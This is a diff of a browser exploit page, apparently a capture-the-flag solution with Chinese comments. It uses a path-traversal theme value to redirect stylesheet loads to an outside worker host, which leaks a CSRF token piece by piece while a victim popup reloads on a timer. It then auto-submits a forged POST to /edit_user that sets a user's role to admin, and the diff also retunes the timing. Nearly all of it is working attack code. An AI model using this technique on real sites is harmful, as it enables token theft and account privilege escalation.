@@ -14,24 +14,21 @@ const TARGET_ORIGIN = "http://localhost:5000";
 const TARGET_USER_ID = "95508c88-6b7f-4d85-a253-b01f3eb1c4ed";
 
 const logEl = document.getElementById("log");
-const log = (...args) => {
-  logEl.textContent += "\n" + args.join(" ");
-  console.log(...args);
-};
+function log(...xs) {
+  const s = xs.join(" ");
+  console.log(s);
+  logEl.textContent += "\n" + s;
+}
 
 const id = crypto.randomUUID();
 const workerHost = new URL(WORKER_BASE).host;
 
 /*
-  重要：
-  題目模板會組成：
-    /static/css/${theme}.css
+  layout.html:
+    <link rel="stylesheet" href="/static/css/{{theme}}.css">
 
-  所以這裡的 theme 要設成：
-    ../../switch_theme?theme=light&redirect_path=//WORKER_HOST/css/ID
-
-  最終 stylesheet request 會變成：
-    /switch_theme?theme=light&redirect_path=//WORKER_HOST/css/ID.css
+  所以 theme 要設成：
+    ../../switch_theme?theme=light&redirect_path=//WORKER/css/ID
 */
 const innerTheme =
   `../../switch_theme?theme=light&redirect_path=//${workerHost}/css/${id}`;
@@ -42,21 +39,18 @@ const victimUrl =
 let victimWin = null;
 let navTimer = null;
 let pollTimer = null;
-let sentFinal = false;
+let finished = false;
 
-function openOrNavigateVictim() {
-  const url = victimUrl + "#r=" + Math.random();
-
+function navVictim() {
+  const u = victimUrl + "#r=" + Math.random();
   try {
     if (!victimWin || victimWin.closed) {
-      victimWin = window.open(url, "victim");
+      victimWin = window.open(u, "victim");
     } else {
-      victimWin.location = url;
+      victimWin.location = u;
     }
   } catch (e) {
-    try {
-      victimWin = window.open(url, "victim");
-    } catch (_) {}
+    log("[!] nav error", String(e));
   }
 }
 
@@ -67,45 +61,39 @@ async function getState() {
   return await r.json();
 }
 
-function sendPrivilegeEscalation(csrfToken) {
-  if (sentFinal) return;
-  sentFinal = true;
-
+function sendFinal(token) {
+  if (finished) return;
+  finished = true;
   clearInterval(navTimer);
   clearInterval(pollTimer);
 
-  log("[+] csrf =", csrfToken);
-  log("[+] sending POST /edit_user");
+  log("[+] token =", token);
+  log("[+] sending final POST");
 
   const form = document.createElement("form");
   form.method = "POST";
   form.action = `${TARGET_ORIGIN}/edit_user`;
   form.target = "victim";
-
-  // 這兩個空字串很重要，不要省略
-  // 不然後端可能拿 g.user['username'] 當預設值，導致驗證卡住
   form.innerHTML = `
     <input name="user_id" value="${TARGET_USER_ID}">
     <input name="username" value="">
     <input name="password" value="">
     <input name="role" value="admin">
-    <input name="csrf_token" value="${csrfToken}">
+    <input name="csrf_token" value="${token}">
   `;
-
   document.body.appendChild(form);
   form.submit();
 
   log("[+] submitted");
-  log("[+] 現在用你自己的帳號重新登入，然後去 /flag");
 }
 
 async function poll() {
   try {
     const st = await getState();
-    log(`[i] prefix=${st.prefix || ""} done=${st.done}`);
+    log(`[i] prefix_len=${(st.prefix || "").length} done=${st.done}`);
 
     if (st.done && st.token) {
-      sendPrivilegeEscalation(st.token);
+      sendFinal(st.token);
     }
   } catch (e) {
     log("[!] poll error", String(e));
@@ -114,15 +102,14 @@ async function poll() {
 
 log("[*] id =", id);
 log("[*] victimUrl =", victimUrl);
-log("[*] opening popup...");
 
-openOrNavigateVictim();
+// 先開一次
+navVictim();
 
-// 高頻率重載 popup，讓 token 一次次往前爆
-navTimer = setInterval(openOrNavigateVictim, 35);
-
-// 輪詢 Worker 狀態
-pollTimer = setInterval(poll, 120);
+// 這裡不要太慢，也不要太快
+// 2-char/round 後，60~80ms 通常比上一版 35ms 更穩
+navTimer = setInterval(navVictim, 70);
+pollTimer = setInterval(poll, 90);
 </script>
 </body>
 </html>
